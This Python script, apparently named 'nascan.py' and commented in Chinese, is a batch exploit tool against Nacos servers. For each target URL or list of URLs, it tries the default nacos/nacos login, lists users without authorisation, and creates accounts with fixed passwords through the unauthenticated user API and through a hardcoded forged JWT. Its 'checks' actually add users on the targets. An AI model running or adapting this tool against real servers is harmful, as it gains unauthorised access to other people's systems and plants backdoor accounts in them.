import random
import argparse
from os import path
import readline
import requests
import urllib3
import ssl
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()
ssl._create_default_https_context=ssl._create_unverified_context

head = {
    'User-Agent':"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    'Content-Type':"application/x-www-form-urlencoded",
    'Connection': 'close'

}
def title():
    print("* " * 20)
    print("[+]漏洞名称：NacosJWT任意用户添加漏洞")
    print("[+]漏洞名称：Nacos任意用户添加漏洞")
    print("[+]漏洞名称：Nacos默认口令")
    print("[+]漏洞名称：未授权查看用户列表漏洞")
    print("* " * 20)

def help():
    print('  python nascan.py -u URL')
    print('  -u, --url <url>       the url to retrieve data from')
    exit()

def poc1(url):
    print("\n\n\n正在检测是否存在nacos默认口令")
    if url.endswith("/"):
        path = "nacos/v1/auth/users/login"
    else:
        path = "/nacos/v1/auth/users/login"
    data = {
        "username": "nacos",
        "password": "nacos"
    }
    checkpoc1 = requests.post(url=url+path,headers=head,data=data,verify=False)
    if checkpoc1.status_code == 200:
        print(Fore.GREEN + url+"[+]存在默认口令nacos")
    else:
        print(Fore.RED + "[-]不存在默认口令")

def poc2(url):
    print("正在检测是否存在未授权查看用户列表漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
    else:
        path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
    checkpoc2 = requests.get(url=url+path,headers=head,verify=False)
    if "username" in checkpoc2.text:
        print(Fore.GREEN + url+ f"[+]存在未授权访问漏洞,你可访问 {url+path} 查看详细信息")
    else:
        print(Fore.RED + "[-]不存在未授权访问漏洞")

def poc3(url):
    print("正在检测是否存在任意用户添加漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users"
    else:
        path = "/nacos/v1/auth/users"
    data = {
        "username": "abc123",
        "password": "123456"
    }
    checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc3.text:
        print(Fore.GREEN + url+ "[+]用户:abc123 添加成功，密码为：123456")
    else:
        print(Fore.RED + url+ "[-]不存在任意用户添加漏洞")

def poc31(url):
    print("正在检测是否存在任意用户添加漏洞，方法二")
    if url.endswith("/"):
        path = "nacos/v1/auth/users"
    else:
        path = "/nacos/v1/auth/users?username=test31&password=123456"
    try:
        checkpoc3 = requests.get(url=url + path, headers=head, verify=False)
        if "create user ok" in checkpoc3.text:
            print(Fore.GREEN + url+ "[+]用户:test31 添加成功，密码为：123456")
        else:
            print(Fore.RED + url+ "[-]不存在任意用户添加漏洞")
    except requests.exceptions.ConnectionError:
        print('方法二错误')
def poc4(url):
    print("正在检测是否存在默认JWT任意用户添加漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    else:
        path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    data = {
        "username": "test2",
        "password": "test123"
    }
    checkpoc4 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc4.text:
        print(Fore.GREEN + url + "[+]用户:test1 添加成功，密码为：test123")
    else:
        print(Fore.RED + "[-]不存在默认JWT任意用户添加漏洞")
def readfile(file,**args):
    with open(file,'r') as f:
        urlfile=f.readlines()
        for url in urlfile:
            url = url.strip('\n')
            poc1(url)
            poc2(url)
            poc3(url)
            poc31(url)
            poc4(url)
        f.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', '--showhelp', action='help', help='显示帮助')
    parser.add_argument("-u", "--url", help="漏洞url地址")
    parser.add_argument("-f", "--file", help="批量检测url", type=str)
    parser.set_defaults(show_help=False)
    args = parser.parse_args()
    title()
    if not args.url:
        if not args.file and not args.show_help:
            print("请输入 -u 参数指定 URL 地址：python3 nascan.py -u url")
            parser.print_help()
            exit()
        elif not args.file:
            parser.print_help()
            exit()
        else:
            try:
                readfile(args.file)
            except Exception as err:
                print(err)
    else:
        try:
            poc1(args.url)
            poc2(args.url)
            poc3(args.url)
            poc31(args.url)
            poc4(args.url)
        except Exception as err:
            print(err)